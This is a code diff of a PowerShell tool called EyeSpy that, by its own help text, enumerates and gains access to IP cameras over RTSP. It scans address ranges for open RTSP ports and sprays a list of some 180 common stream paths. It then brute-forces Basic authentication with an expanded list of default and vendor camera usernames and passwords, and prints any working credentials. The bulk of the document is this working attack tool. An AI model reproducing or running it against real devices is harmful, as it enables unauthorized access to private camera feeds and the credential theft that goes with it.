@@ -1,20 +1,3 @@
-<#
-Attack Path: Find Port -> Find AuthType -> Find Creds -> Find Path
-
-
-If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
-If it's a 404, it means that the route is incorrect but the credentials might be okay.
-If it's a 200, the stream is accessed successfully.
-
-Step 1: Scan all routes with no credentials, look for 200, if found, No-Auth - Camera Obtained
-Step 2: Check for 404 results and dont scan that route again - its wrong
-Step 3: Of the 401 and 403 routes, Attempt credential attack, look for 200 again
-Step 4: If nothing else is found, then Credentials and Route not found, attack failed.
-
-Roll in Early Termination of 200 requests.
-
-#>
-
 function EyeSpy {
 
     [CmdletBinding(DefaultParameterSetName = 'Default')]
@@ -24,6 +7,9 @@ function EyeSpy {
 
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$FullAuto,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$PathScan,
 
         #[Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         #[int]$Threads = 50,
@@ -37,15 +23,23 @@ function EyeSpy {
 
         $HelpOutput = @("
 [ Help ] ================================================
-
-                    EyeSpy 
-                    by: Miiden
+         _______             _______             
+        |    ___.--.--.-----|     __.-----.--.--.
+        |    ___|  |  |  -__|__     |  _  |  |  |
+        |_______|___  |_____|_______|   __|___  |
+                |_____|             |__|  |_____|   
+                      
+         By: Miiden 
+         GitHub: https://github.com/Miiden
 
 =========================================================
- 
+ EyeSpy is a tool to enumerate and gain access to
+ IP Cameras via RTSP 
+
+
  Example Usage:
 
- EyeSpy -Scan 192.168.0.1/24
+ EyeSpy -Scan 192.168.0.123
  Eyespy -FullAuto 192.168.0.1/24
 
 =========================================================
@@ -58,20 +52,18 @@ function EyeSpy {
 
     $Banner = @("
 =========================================================
-                
-=========================================================
          _______             _______             
         |    ___.--.--.-----|     __.-----.--.--.
         |    ___|  |  |  -__|__     |  _  |  |  |
         |_______|___  |_____|_______|   __|___  |
                 |_____|             |__|  |_____|   
-                                               
-=========================================================
-                By: Miiden
+                      
+         By: Miiden 
+         GitHub: https://github.com/Miiden
 =========================================================
     ")
 
-    if (!$Scan -and !$FullAuto) {
+    if (!$Scan -and !$FullAuto -and -!$PathScan) {
     
         Write-Host
         Write-Host "[!] " -ForegroundColor "Red" -NoNewline
@@ -87,6 +79,7 @@ function EyeSpy {
 
 $Banner
 
+#Function to Get Valid IP address ranges when supplied with a CIDR
 function Get-IpRange {
         [CmdletBinding(ConfirmImpact = 'None')]
         Param(
@@ -144,9 +137,7 @@ function Get-IpRange {
             return $Computers
         }
 }
-
-
-
+#Function to check if a default/common RTSP port is open 554, 8554, 5554
 function PortScan {
         [CmdletBinding(ConfirmImpact = 'None')]
         Param(
@@ -156,7 +147,6 @@ function PortScan {
 
     $Ports = @(554, 8554, 5554)
     $Timeout = 300
-    $AlivePorts = @()
 
     $scriptBlock = {
         
@@ -202,9 +192,9 @@ function PortScan {
                 })
             }   
         }
+        return $AlivePorts
 }
-
-
+#Function to use Async-Runtimes (Badly) and handle any results from other functions
 function Async-Runspaces {
         [CmdletBinding(ConfirmImpact = 'None')]
         Param(
@@ -213,18 +203,25 @@ function Async-Runspaces {
             [Parameter(Mandatory, ValueFromPipeline, Position = 1)]
             [string[]] $Option
 
-        )     
+        )   
+        
+        #Function Wide Variables  
         $Threads = 50
         $Timeout = 300
         $ReturnedResult = @()
+        $Auth200 = $False
+        $NoAuth200 = $False
+
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
         $runspacePool.Open()
         $runspaces = New-Object System.Collections.ArrayList
 
+
+        #My Weird way of Calling the Scripts/Runtime blocks to be used in this function
         if ($Option -eq "PortScan"){
             PortScan -Target $Target
-        } elseif ($Option -eq "AttackCamera"){
-            AttackCamera -Targets $Target
+        } elseif ($Option -eq "PathAttack" -or $Option -eq "FullPathAttack"){
+            PathAttack -Targets $Target
         } elseif ($Option -eq "AuthAttack"){
             AuthAttack -Targets $Target
         }
@@ -242,28 +239,28 @@ function Async-Runspaces {
                     if ($result -eq "Error with Connection"){
                         continue
                     }
+                    # Handling of the PortScan Results:
                     elseif($Option -eq "PortScan") {
-                        Write-Host -ForegroundColor Green "$result"
                         $ReturnedResult += $result
 
-                    }elseif($Option -eq "AttackCamera") {
+                    # Handling of the Path Attacking Results:
+                    }elseif($Option -eq "PathAttack" -or $Option -eq "FullPathAttack") {
                         $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
                         if ($result[3] -eq "200"){
                             #Checking for No Authentication on all Paths
                             Write-Host -ForegroundColor Green "No Authentication Required:" $concat
-
+                            if ($Option -eq "PathAttack"){$NoAuth200 = $True}
+                            
                         } elseif ($result[3] -eq "401" -or $result[3] -eq "403"){
                             #Find any 401's or 403's for Authentication BruteForcing
-                            Write-Host -ForegroundColor Yellow $result[3] $concat
                             $ReturnedResult += $concat
                         
                         } else {
-                            #Should catch any other status codes including 404
-                            #Debugging line
-                            #Write-Host -NoNewline -ForegroundColor Yellow $result[0]  $result[2] $result[3]
+                            #Should catch and discard any other status codes including 404
                             continue
                         }
 
+                    # Handling of the Credential Attacking Results:
                     }elseif ($Option -eq "AuthAttack") {
                         $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
                         $foundCreds = $result[4] + ":" + $result[5]
@@ -271,37 +268,71 @@ function Async-Runspaces {
                             #Basic Auth Credentials Found
                             Write-Host -NoNewline -ForegroundColor Green "Credentials Found:" $concat 
                             Write-Host " -> " $foundCreds
+                            $Auth200 = $True
                         } else {
-                            #Should catch any other status codes including 404
-                            #Debugging line
-                            #Write-Host -NoNewline -ForegroundColor Yellow $result[0]  $result[2] $result[3]
+                            #Should catch and discard any other status codes including 404
+
                             continue
                         }
-                        #$ReturnedResult += $result
                         
-                        }
+                    }
 
                 }
             }
 
-            Start-Sleep -Milliseconds 100
+        Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
+        
+        if ($NoAuth200 -eq $true -or $Auth200 -eq $true) {
+             $runspaces | ForEach-Object {
+                $runspacePool.Close()
+                $runspacePool.Dispose()
+             }
+             return $ReturnedResult
+        }
 
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
         return $ReturnedResult
 }
-
-
-function AttackCamera {
+#Function outlines the Runtime Environments when Enumerating common IP Camera URL Paths
+function PathAttack {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
         [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
         [string[]] $Targets
     ) 
 
-    $Paths = @("", "MyPath", "MyScan", "axis/camera", "11/01", "MyStream")
+    #Variable for many common paths used by IP cameras
+    $Paths = @( "", "MyStream", "/live/ch01_0", "0/1:1/main", "0/video1", "1", "1.AMP", "1/h264major", "1/stream1",
+    "11", "12", "125", "1080p", "1440p", "480p", "4K", "666", "720p", "AVStream1_1", "CAM_ID.password.mp2",
+    "CH001.sdp", "GetData.cgi", "HD", "HighResolutionVideo", "LowResolutionVideo", "MediaInput/h264",
+    "MediaInput/mpeg4", "ONVIF/MediaInput", "StdCh1", "Streaming/Channels/1", "Streaming/Unicast/channels/101",
+    "VideoInput/1/h264/1", "VideoInput/1/mpeg4/1", "access_code", "access_name_for_stream_1_to_5",
+    "api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2", "axis-media/media.amp", "axis-media/media.amp?camera=1",
+    "axis-media/media.amp?videocodec=h264", "cam", "cam/realmonitor", "cam/realmonitor?channel=0&subtype=0",
+    "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
+    "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "cam0", "cam0_0", "cam0_1", "cam1",
+    "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
+    "cam1/onvif-h264", "camera.stm", "ch0", "ch00/0", "ch001.sdp", "ch01.264", "ch01.264?", "ch01.264?ptype=tcp",
+    "ch1_0", "ch2_0", "ch3_0", "ch4_0", "ch1/0", "ch2/0", "ch3/0", "ch4/0", "ch0_0.h264", "ch0_unicast_firststream",
+    "ch0_unicast_secondstream", "ch1-s1", "channel1", "gnz_media/main", "h264", "h264.sdp", "h264/ch1/sub/av_stream",
+    "h264/media.amp", "h264Preview_01_main", "h264Preview_01_sub", "h264_vga.sdp", "h264_stream", "image.mpg", "img/media.sav",
+    "img/media.sav?channel=1", "img/video.asf", "img/video.sav", "ioImage/1", "ipcam.sdp", "ipcam_h264.sdp", "ipcam_mjpeg.sdp",
+    "live", "live.sdp", "live/av0", "live/ch0", "live/ch00_0", "live/ch01_0", "live/h264", "live/main", "live/main0", "live/mpeg4",
+    "live1.sdp", "live3.sdp", "live_mpeg4.sdp", "live_st1", "livestream", "main", "media", "media.amp", "media.amp?streamprofile=Profile1",
+    "media/media.amp", "media/video1", "medias2", "mjpeg/media.smp", "mp4", "mpeg/media.amp", "mpeg4", "mpeg4/1/media.amp",
+    "mpeg4/media.amp", "mpeg4/media.smp", "mpeg4unicast", "mpg4/rtsp.amp", "multicaststream", "now.mp4", "nph-h264.cgi",
+    "nphMpeg4/g726-640x", "nphMpeg4/g726-640x48", "nphMpeg4/g726-640x480", "nphMpeg4/nil-320x240", "onvif-media/media.amp",
+    "onvif1", "play1.sdp", "play2.sdp", "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
+    "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "stream", "stream/0", "stream/1", "stream/live.sdp",
+    "stream.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "streaming/channels/101", "tcp/av0_0", "test",
+    "tmpfs/auto.jpg", "trackID=1", "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg",
+    "video.mp4", "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp", "video1+audio1",
+    "videoMain", "videoinput_1/h264_1/media.stm", "videostream.asf", "vis", "wfov"
+    )
+
     $Timeout = 300
 
     $scriptBlock = {
@@ -324,8 +355,7 @@ function AttackCamera {
 
                             $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                             $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
-                                       "CSeq: 2$CRLF$CRLF" #+
-                                       #"Authorization: Basic YWRtaW46YWRtaW4=$CRLF$CRLF"
+                                       "CSeq: 2$CRLF$CRLF"
 
 
                             $Writer.Write($request)
@@ -392,8 +422,7 @@ function AttackCamera {
 
 
 }
-
-
+#Function outlines the Runtime Environments when Attempting to Spray Common IP Camera Credentials
 function AuthAttack {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
@@ -401,9 +430,24 @@ function AuthAttack {
         [string[]] $Targets
     ) 
 
-    $UserList = @("root","admin","administrator")
-    $PassList = @("root","admin", "password")
-    $Timeout = 500
+    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
+                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
+                )
+
+    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
+                "123", "1234", "12345", "123456", "1234567", "12345678",
+                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
+                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
+                "administrator", "Administrator", "aiphone", "camera",
+                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
+                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
+                "Pass", "password", "password123", "qwerty", "qwerty123",
+                "Recorder", "reolink", "root", "service", "supervisor",
+                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
+                "user", "wbox", "wbox123", "Y5eIMz3C"
+                )
+
+    $Timeout = 100
 
     $scriptBlock = {
         
@@ -439,7 +483,6 @@ function AuthAttack {
                                     if ($line -eq $null) { break }
                                         $response += $line + $CRLF
                                 }
-                                Start-Sleep -Milliseconds 100
                             } catch [System.IO.IOException] {
                                 # Catching the exception without taking any action
             
@@ -502,8 +545,8 @@ function AuthAttack {
 
 }
 
-
 [array]$AlivePorts = @()
+
 
     if ($Scan){
 
@@ -512,21 +555,49 @@ function AuthAttack {
     
         if ($AlivePorts.Length -eq 0){  
             Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
-            Write-Host $AlivePorts
             return
+        } else {
+            Write-Host "Open RTSP Ports Found:"
+            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")
+            }
+        return
         }
-        $AlivePorts
-   
+
+    if ($PathScan){
+        $IpAddr = Get-IpRange -Target $PathScan
+        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
+
+        if ($AlivePorts){ 
+            Write-Host "Open RTSP Ports Found:"
+            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
+            Write-Host "Spraying Paths:"
+            Start-Sleep -Milliseconds 500
+            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "PathAttack"
+
+            if ($PathsToAttack){
+                #Print the Possible Paths to the Host
+                Write-Host -ForegroundColor Yellow ($PathsToAttack -join "`n")"`n"
+            } else {
+                Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
+            }
+        } else {
+            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
+            Write-Host $AlivePorts
+        }
         return
     }
+
 
     if ($FullAuto){
         $IpAddr = Get-IpRange -Target $FullAuto
         $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
 
         if ($AlivePorts){ 
+            Write-Host "Open RTSP Ports Found:"
+            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
+            Write-Host "Spraying Paths and Credentials:"
             Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "AttackCamera"
+            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "FullPathAttack"
             if ($PathsToAttack){
                 #Run the AuthAttack function
                 Async-Runspaces -Target $PathsToAttack -Option "AuthAttack"
@@ -541,8 +612,4 @@ function AuthAttack {
         return
     }
 
-
-
 }
-
-#return #[pscustomobject]@{ Address = $IP; Port = $port; Open = $open }
